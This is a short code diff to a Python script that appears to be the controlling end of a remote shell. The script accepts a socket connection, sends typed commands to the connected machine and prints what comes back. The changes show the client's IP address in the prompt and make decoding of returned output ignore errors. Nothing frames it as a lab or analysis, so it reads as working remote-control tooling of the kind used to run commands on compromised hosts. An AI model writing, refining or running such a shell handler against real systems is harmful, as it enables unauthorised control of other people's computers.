@@ -21,7 +21,7 @@ conn,addr = s.accept()
 
 while True:
     try:
-        shell = input("Shell> ")
+        shell = input(f"\n{addr[0]}@Shell> ")
         if shell == 'exit':
             sys.exit()
             conn.close()
@@ -29,7 +29,7 @@ while True:
 
         if len(str.encode(shell)) > 0:
             conn.send(str.encode(shell))
-            c_responde = str(conn.recv(1024), 'utf-8')
+            c_responde = str(conn.recv(1024), 'utf-8', errors="ignore")
             print(c_responde, end="")
     
     except KeyboardInterrupt:
